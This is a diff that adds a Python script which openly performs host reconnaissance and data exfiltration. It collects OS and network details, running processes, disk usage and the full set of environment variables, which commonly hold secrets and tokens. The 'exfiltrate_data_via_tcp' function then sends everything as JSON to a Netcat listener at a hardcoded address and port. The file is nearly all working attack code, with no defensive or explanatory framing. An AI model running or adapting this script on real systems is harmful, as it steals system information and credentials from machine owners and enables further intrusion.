@@ -1,0 +1,101 @@
+import socket
+import json
+import platform
+import os
+import psutil
+import subprocess
+
+def collect_system_metadata():
+    """Gather system metadata and basic recon data."""
+    metadata = {
+        "os": platform.system(),
+        "os_version": platform.version(),
+        "os_release": platform.release(),
+        "architecture": platform.architecture()[0],
+        "hostname": socket.gethostname(),
+        "ip_address": socket.gethostbyname(socket.gethostname()),
+        "current_user": os.getlogin(),
+        "boot_time": psutil.boot_time(),
+    }
+    return metadata
+
+def get_running_processes():
+    """Get a list of running processes."""
+    processes = []
+    for proc in psutil.process_iter(['pid', 'name', 'username']):
+        try:
+            processes.append(proc.info)
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+            pass
+    return processes
+
+def get_network_info():
+    """Get network interface and connection details."""
+    interfaces = psutil.net_if_addrs()
+    connections = psutil.net_connections()
+    network_info = {
+        "interfaces": {iface: [addr.address for addr in addrs] for iface, addrs in interfaces.items()},
+        "connections": [
+            {
+                "fd": conn.fd,
+                "family": str(conn.family),
+                "type": str(conn.type),
+                "local_address": conn.laddr,
+                "remote_address": conn.raddr if conn.raddr else None,
+                "status": conn.status,
+                "pid": conn.pid,
+            }
+            for conn in connections if conn.raddr  # Only include active connections
+        ],
+    }
+    return network_info
+
+def get_disk_usage():
+    """Get disk usage statistics."""
+    disk_info = {}
+    for partition in psutil.disk_partitions():
+        try:
+            usage = psutil.disk_usage(partition.mountpoint)
+            disk_info[partition.mountpoint] = {
+                "total": usage.total,
+                "used": usage.used,
+                "free": usage.free,
+                "percent": usage.percent,
+            }
+        except PermissionError:
+            disk_info[partition.mountpoint] = "Permission Denied"
+    return disk_info
+
+def get_environment_variables():
+    """Get environment variables."""
+    return dict(os.environ)
+
+def exfiltrate_data_via_tcp(data, host, port):
+    """Send data to a Netcat listener."""
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect((host, port))
+            s.sendall(data.encode('utf-8'))
+            print("[+] Data sent successfully!")
+    except Exception as e:
+        print(f"[-] Failed to exfiltrate data: {e}")
+
+if __name__ == "__main__":
+    # Collect system metadata
+    metadata = {
+        "system_info": collect_system_metadata(),
+        "running_processes": get_running_processes(),
+        "network_info": get_network_info(),
+        "disk_usage": get_disk_usage(),
+        "environment_variables": get_environment_variables(),
+    }
+    
+    # Convert metadata to JSON format
+    metadata_json = json.dumps(metadata, indent=4)
+
+    # Define Netcat listener's IP and port
+    nc_host = "192.168.100.2"  # Replace with your listener's IP
+    nc_port = 9001             # Replace with your listener's port
+
+    # Exfiltrate data
+    exfiltrate_data_via_tcp(metadata_json, nc_host, nc_port)
